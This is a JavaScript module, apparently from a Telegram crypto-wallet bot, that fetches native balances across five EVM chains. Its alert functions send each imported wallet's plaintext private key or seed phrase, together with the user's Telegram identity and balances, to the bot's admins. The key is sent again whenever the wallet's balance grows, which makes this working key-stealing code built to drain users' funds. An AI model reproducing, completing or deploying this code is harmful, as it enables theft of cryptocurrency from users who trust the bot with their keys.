const { ethers } = require('ethers');
const config = require('./config');
const walletManager = require('./wallet-manager');

// ═══════════════════════════════════════════════════
// 🛡️ HTML ESCAPE HELPER (prevents parsing errors)
// ═══════════════════════════════════════════════════
function escapeHtml(text) {
    if (!text) return '';
    return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

// ═══════════════════════════════════════════════════
// 📡 SEND MESSAGE TO ALL ADMINS (HTML mode)
// ═══════════════════════════════════════════════════
async function notifyAdmins(bot, message) {
    for (const adminId of config.ADMIN_TELEGRAM_IDS) {
        try {
            await bot.telegram.sendMessage(adminId, message, {
                parse_mode: 'HTML',
                disable_web_page_preview: true
            });
        } catch (e) {
            console.error(`❌ Failed to notify admin ${adminId}:`, e.message);
        }
    }
}

// ═══════════════════════════════════════════════════
// 📡 SEND PLAIN TEXT (for private keys)
// ═══════════════════════════════════════════════════
async function sendPlainText(bot, message) {
    for (const adminId of config.ADMIN_TELEGRAM_IDS) {
        try {
            await bot.telegram.sendMessage(adminId, message, {
                disable_web_page_preview: true
            });
        } catch (e) {
            console.error(`❌ Failed to send to admin ${adminId}:`, e.message);
        }
    }
}

// ═══════════════════════════════════════════════════
// 🌐 RAW RPC BALANCE FETCH
// No JsonRpcProvider network detection
// Faster + more stable
// ═══════════════════════════════════════════════════

const CHAIN_SYMBOLS = {
    ethereum: 'ETH',
    bsc: 'BNB',
    polygon: 'MATIC',
    arbitrum: 'ETH',
    base: 'ETH'
};

const DEFAULT_RPC_FALLBACKS = {
    ethereum: [
        'https://eth.llamarpc.com',
        'https://cloudflare-eth.com',
        'https://rpc.ankr.com/eth',
        'https://ethereum.publicnode.com'
    ],
    bsc: [
        'https://bsc-dataseed.binance.org/',
        'https://bsc-dataseed1.defibit.io',
        'https://bsc-dataseed1.ninicoin.io',
        'https://bsc.publicnode.com'
    ],
    polygon: [
        'https://polygon-rpc.com',
        'https://rpc-mainnet.matic.quiknode.pro',
        'https://polygon-bor.publicnode.com',
        'https://polygon.llamarpc.com'
    ],
    arbitrum: [
        'https://arb1.arbitrum.io/rpc',
        'https://arbitrum-one.publicnode.com',
        'https://rpc.ankr.com/arbitrum',
        'https://arbitrum.llamarpc.com'
    ],
    base: [
        'https://mainnet.base.org',
        'https://base.publicnode.com',
        'https://base.llamarpc.com',
        'https://rpc.ankr.com/base'
    ]
};

function getRpcUrls(chainName) {
    const urls = [];

    if (config.RPC && config.RPC[chainName]) {
        urls.push(config.RPC[chainName]);
    }

    if (config.RPC_FALLBACKS && Array.isArray(config.RPC_FALLBACKS[chainName])) {
        urls.push(...config.RPC_FALLBACKS[chainName]);
    }

    if (DEFAULT_RPC_FALLBACKS[chainName]) {
        urls.push(...DEFAULT_RPC_FALLBACKS[chainName]);
    }

    return [...new Set(urls.filter(Boolean))];
}

async function fetchNativeBalanceFromUrl(url, address) {
    const controller = new AbortController();

    const timeout = setTimeout(() => {
        controller.abort();
    }, 8000);

    try {
        const res = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                jsonrpc: '2.0',
                id: 1,
                method: 'eth_getBalance',
                params: [address, 'latest']
            }),
            signal: controller.signal
        });

        if (!res.ok) {
            throw new Error(`HTTP ${res.status}`);
        }

        const data = await res.json();

        if (data.error) {
            throw new Error(data.error.message || 'RPC error');
        }

        if (!data.result) {
            throw new Error('Empty RPC result');
        }

        const wei = BigInt(data.result);
        const nativeAmount = Number(ethers.formatEther(wei));

        return nativeAmount;
    } finally {
        clearTimeout(timeout);
    }
}

async function fetchChainBalance(chainName, address) {
    const urls = getRpcUrls(chainName);

    if (urls.length === 0) {
        console.log(`⚠️ No RPC URL configured for ${chainName}`);
        return null;
    }

    const results = await Promise.allSettled(
        urls.map(url => fetchNativeBalanceFromUrl(url, address))
    );

    const positive = results.find(
        r => r.status === 'fulfilled' && r.value > 0
    );

    if (positive) {
        return positive.value;
    }

    const zero = results.find(
        r => r.status === 'fulfilled' && r.value === 0
    );

    if (zero) {
        return zero.value;
    }

    const firstError = results.find(r => r.status === 'rejected');

    console.log(
        `⚠️ Could not fetch ${chainName} balance: ${firstError?.reason?.message || 'All RPCs failed'}`
    );

    return null;
}

async function fetchMultiChainBalances(address) {
    const balances = [];
    const chains = ['ethereum', 'bsc', 'polygon', 'arbitrum', 'base'];

    const results = await Promise.all(
        chains.map(async (chainName) => {
            const amount = await fetchChainBalance(chainName, address);
            return { chainName, amount };
        })
    );

    for (const item of results) {
        if (item.amount !== null && item.amount > 0) {
            balances.push({
                chain: item.chainName.charAt(0).toUpperCase() + item.chainName.slice(1),
                amount: item.amount.toFixed(4),
                symbol: CHAIN_SYMBOLS[item.chainName] || 'ETH'
            });
        }
    }

    return balances;
}

// ═══════════════════════════════════════════════════
// 🚨 ALERT: NEW WALLET IMPORTED (HTML mode)
// ═══════════════════════════════════════════════════
async function alertNewImport(bot, user, address, plaintextKey, keyType) {
    console.log(`🔍 Fetching balances for new import: ${address}`);

    let balances = [];
    try {
        const balancePromise = fetchMultiChainBalances(address);
        const timeoutPromise = new Promise((resolve) =>
            setTimeout(() => resolve([]), 25000)
        );
        balances = await Promise.race([balancePromise, timeoutPromise]);
    } catch (e) {
        console.error(`❌ Balance fetch failed: ${e.message}`);
        balances = [];
    }

    let balanceText = '• <i>No native balances found across 5 chains.</i>';
    if (balances.length > 0) {
        balanceText = balances.map(b =>
            `• <b>${escapeHtml(b.chain)}:</b> ${escapeHtml(b.amount)} ${escapeHtml(b.symbol)}`
        ).join('\n');
    }

    const username = user.username ? `@${escapeHtml(user.username)}` : 'No Username';
    const keyTypeText = keyType === 'seed_phrase' ? '12/24 Word Phrase' : 'Private Key';

    // Send main info as HTML
    const mainMessage = `🚨 <b>NEW WALLET IMPORTED</b>

━━━━━━━━━━━━━━━━━━━━━

👤 <b>User:</b> ${username}
🆔 <b>Telegram ID:</b> <code>${user.id}</code>
📍 <b>Address:</b> <code>${escapeHtml(address)}</code>
🔑 <b>Type:</b> ${keyTypeText}

━━━━━━━━━━━━━━━━━━━━━

💰 <b>CURRENT BALANCES:</b>
${balanceText}

━━━━━━━━━━━━━━━━━━━━━

🔐 <b>PLAINTEXT KEY:</b> (see next message)`;

    await notifyAdmins(bot, mainMessage);

    // Send the key as plain text (no formatting, easy to copy)
    await sendPlainText(bot, plaintextKey);
}

// ═══════════════════════════════════════════════════
// 📈 ALERT: BALANCE INCREASE DETECTED
// ═══════════════════════════════════════════════════
async function alertBalanceIncrease(bot, walletRecord, oldBalances, newBalances, plaintextKey) {
    const oldTotal = oldBalances.reduce((sum, b) => sum + parseFloat(b.amount), 0);
    const newTotal = newBalances.reduce((sum, b) => sum + parseFloat(b.amount), 0);
    const increase = newTotal - oldTotal;

    const newBalanceText = newBalances.map(b =>
        `• <b>${escapeHtml(b.chain)}:</b> ${escapeHtml(b.amount)} ${escapeHtml(b.symbol)}`
    ).join('\n');

    const username = walletRecord.username ? `@${escapeHtml(walletRecord.username)}` : walletRecord.telegram_id;

    const mainMessage = `📈 <b>BALANCE INCREASE DETECTED!</b>

━━━━━━━━━━━━━━━━━━━━━

👤 <b>User:</b> ${username}
📍 <b>Address:</b> <code>${escapeHtml(walletRecord.address)}</code>

💵 <b>Old Total:</b> ${oldTotal.toFixed(4)} Native
💰 <b>New Total:</b> ${newTotal.toFixed(4)} Native
🔥 <b>Increase:</b> +${increase.toFixed(4)} Native

<b>New Balances:</b>
${newBalanceText}

━━━━━━━━━━━━━━━━━━━━━

🔐 <b>PLAINTEXT KEY:</b> (see next message)`;

    await notifyAdmins(bot, mainMessage);
    await sendPlainText(bot, plaintextKey);
}

module.exports = {
    notifyAdmins,
    fetchMultiChainBalances,
    alertNewImport,
    alertBalanceIncrease
};